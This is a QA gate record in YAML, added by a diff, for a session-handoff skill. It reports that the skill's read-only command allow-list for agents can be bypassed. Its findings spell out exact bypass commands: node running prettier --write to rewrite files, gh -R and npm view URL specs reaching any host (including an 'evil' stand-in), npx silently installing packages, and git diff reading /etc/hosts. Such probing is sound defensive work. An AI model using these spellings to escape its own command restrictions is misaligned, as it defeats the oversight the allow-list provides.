@@ -1,0 +1,115 @@
+schema: 1
+task: 'task.110.session-handoff-skill'
+task_title: 'A session-handoff skill that writes the handoff and re-measures it on read'
+gate: FAIL
+status_reason: 'Cycle-6 fixes verified (bug.6, bug.7 closed; all three mechanisms mutation-proven, the per-spec patternFlags path now tested). Unscoped safety re-probe (1,377 isAllowed spellings, 5 executed through the verifier or against a local listener) found the read-only invariant open in a fourth arm: node/python3 run any relative script with any arguments, so node node_modules/prettier/bin/prettier.cjs --write rewrote a fixture tree (HIGH, no precondition) and the repo''s own writers (registry-tick, gh-stage, generate_catalog) are reachable; gh list/view -R/URL and npm view <url-spec> reach any host (MEDIUM, egress); npx installs a missing tool from the registry without a prompt (MEDIUM). HIGH sequence across gates 5, 6, 7: 0, 1, 1 — third-strike does not fire.'
+reviewer: 'QA Engineer'
+updated: '2026-09-15T06:59:23Z'
+
+top_issues:
+  - id: 'QA-1'
+    severity: high
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'interpreterRule holds only the leading flags and the script path; everything after any relative script is passed through, so node node_modules/prettier/bin/prettier.cjs --write scripts/ugly.js ran through read mode and rewrote the file (executed, verdict confirmed, git status M) — the write npx --write and npm run format:check -- --write are refused for — and the repo''s own writers are reachable by the same spelling: registry-tick.js (ran to its decision under --dry-run), gh-stage.js --stage done, tracker-comment.js, generate_catalog.py, bundle_skill.py --all (the refused npm run generate-catalog / bundle, one spelling away).'
+    suggested_action: 'Hold the script positional to an exact allow-list of read-only in-repo entry points (the NPM_SCRIPTS discipline), or at minimum refuse node_modules/ and .bin/ segments and document the residual trust in SKILL.md; add the executed spellings to the refused-list test and the live handoff''s entry points to the allowed list.'
+    suggested_owner: dev
+    bug_ref: 'task.110.bug.8.interpreter-arm-runs-any-in-repo-script-including-writers.md'
+    status: open
+  - id: 'QA-2'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'gh list/view verbs reach any host: --repo is in PATTERN_FLAGS (--repo=https://evil/o/r skips the value rule), -R evil/o/r and gh repo view https://evil/o/r are POS.ANY positionals; executed: gh pr list -R 127.0.0.1:8099/o/r POSTed to https://127.0.0.1:8099/api/graphql (no token in the default configuration; GH_ENTERPRISE_TOKEN would be presented — reasoned).'
+    suggested_action: 'Drop --repo/-R from GH_LIST_VIEW_FLAGS or hold the value to owner/name; anchor list/view positionals to ^[A-Za-z0-9._-]+$; refused-list tests for the three spellings.'
+    suggested_owner: dev
+    bug_ref: 'task.110.bug.9.gh-and-npm-reach-any-host-through-repo-and-package-specs.md'
+    status: open
+  - id: 'QA-3'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'npm view / npm ls positionals are POS.ANY, and a package spec may be a URL: executed npm view http://127.0.0.1:8099/pkg.tgz → listener received GET /pkg.tgz; npm view git+http://127.0.0.1:8099/x/y.git → npm ran git ls-remote/fetch against the URL (GET /x/y.git/info/refs?service=git-upload-pack) — the gate-3 PRB-8 primitive through npm; a git+ssh spec would use the reader''s agent.'
+    suggested_action: 'Hold npm view/ls positionals to a bare package-name pattern (optional @scope, name, optional @version; no :, no //, no git+/file: prefix); refused-list tests for the tarball, git+http and git+ssh spellings.'
+    suggested_owner: dev
+    bug_ref: 'task.110.bug.9.gh-and-npm-reach-any-host-through-repo-and-package-specs.md'
+    status: open
+  - id: 'QA-4'
+    severity: medium
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'npxRule makes --no-install optional while the runner spawns non-TTY with CI=1, under which npm 11 installs a missing package without prompting (executed: CI=1 npx cowsay@1.6.0 probe </dev/null printed "will be installed" and ran); nine of the ten allow-listed tools are absent from this repo''s node_modules/.bin, so npx tsc --noEmit fetches and runs the registry package named tsc, which is not TypeScript.'
+    suggested_action: 'Require the --no-install/--no prefix in npxRule, or inject --no into the spawned argv for the npx arm; refused-list test for a bare npx stylelint --version.'
+    suggested_owner: dev
+    bug_ref: 'task.110.bug.10.npx-installs-a-missing-tool-from-the-registry.md'
+    status: open
+  - id: 'QA-5'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: '-w is in GH_LIST_VIEW_FLAGS for gh run list --workflow, but on pr/issue/repo/release/workflow view it is --web and opens the reader''s browser (SKILL.md says "never --web"); reasoned from gh --help, not executed.'
+    suggested_action: 'Accept -w only under run list (or drop it; the live handoff uses --workflow); refused-list test for gh pr view 1 -w.'
+    suggested_owner: dev
+    status: open
+  - id: 'QA-6'
+    severity: low
+    file: 'skills/session-handoff/scripts/handoff-verify.mjs'
+    finding: 'checkArgs applies POS.ANY after -- regardless of the spec''s positional policy, so git diff --no-index -- /etc/hosts scripts/ugly.js reads an outside file through an arm that is not a plain reader (executed; two lines echoed); capability already exists via cat, so consistency only.'
+    suggested_action: 'After --, apply the spec''s own positional policy (and allowAbsolute) instead of POS.ANY.'
+    suggested_owner: dev
+    status: open
+
+waiver:
+  active: false
+
+quality_score: 40
+
+evidence:
+  tests_reviewed: 28
+  phases_verified: '3/3'
+  trace:
+    phases_covered: [1, 2, 3]
+    phases_with_issues: [2]
+
+nfr_validation:
+  security:
+    status: FAIL
+    evidence: measured
+    probes_executed: 1377
+    notes: '1,377 isAllowed() spellings (all-sink corpus × 8 argument positions, plus a fresh enumeration of git/gh/node/npm/npx/utility flags); 5 executed — prettier --write through the node arm rewrote a fixture file via read mode; registry-tick reached under --dry-run; gh -R and npm view URL specs reached a local listener; npx installed cowsay non-TTY. Refuted: node --test-only <script> --test -r X does not preload (marker absent); gh api http:host/x goes to api.github.com. Cycle-6 shapes all refused; three cycle-6 mechanisms mutation-proven (covered).'
+  performance:
+    status: PASS
+    notes: 'Live read mode at --timeout 20 completes in seconds; cap and timeout bound every child.'
+  reliability:
+    status: PASS
+    notes: 'Timeout and truncation report unverifiable; no orphaned children after the live run; TMPDIR=/tmp 28/28.'
+  maintainability:
+    status: CONCERNS
+    notes: 'SKILL.md opens with "a read-only whitelist" while the node row documents an open-ended trust in any relative script — the two statements need reconciling whichever fix is chosen; per-spec patternFlags now tested (QA-5 of gate 6 closed).'
+
+code_review:
+  blocking: true
+  reviewer: 'Explore subagent, unscoped safety re-probe over the code-only branch diff (3,702 lines), returned at 21m27s — past the 10-minute budget, not killed; its block was in hand before this gate was written'
+  bugs: 5
+  cleanups: 0
+  boundary: true
+  probes_executed: 1377
+
+recommendations:
+  immediate:
+    - action: 'bug.8 — allow-list the interpreter arm''s script positional by exact path (or refuse node_modules/ and .bin/ and document the residual trust); refused-list tests for the prettier.cjs --write, registry-tick, gh-stage and generate_catalog spellings; allowed tests for the live handoff''s entry points.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs', 'skills/session-handoff/tests/handoff-verify.test.js', 'skills/session-handoff/SKILL.md']
+    - action: 'bug.9 — drop or constrain --repo/-R and URL positionals on gh list/view; package-name pattern for npm view/ls.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs', 'skills/session-handoff/tests/handoff-verify.test.js']
+    - action: 'bug.10 — require --no-install in the npx arm (or inject --no).'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs', 'skills/session-handoff/tests/handoff-verify.test.js']
+  future:
+    - action: '-w only under run list; apply the spec''s positional policy after --; reconcile the SKILL.md read-only claim with the chosen trust boundary.'
+      refs: ['skills/session-handoff/scripts/handoff-verify.mjs', 'skills/session-handoff/SKILL.md']
+
+bug_resolution:
+  bugs_fixed: 2
+  bugs_remaining: 3
+  fix_date: '2026-09-15'
+  total_iterations: 6
+  verification_method: 'Executed probes through the verifier in a scratch fixture and against a local listener; mutation proofs; live handoff read mode'
+
+deployment_readiness:
+  staging: BLOCKED
+  production: BLOCKED
+  conditions: ['bug.8 closed', 'bug.9 closed', 'bug.10 closed']
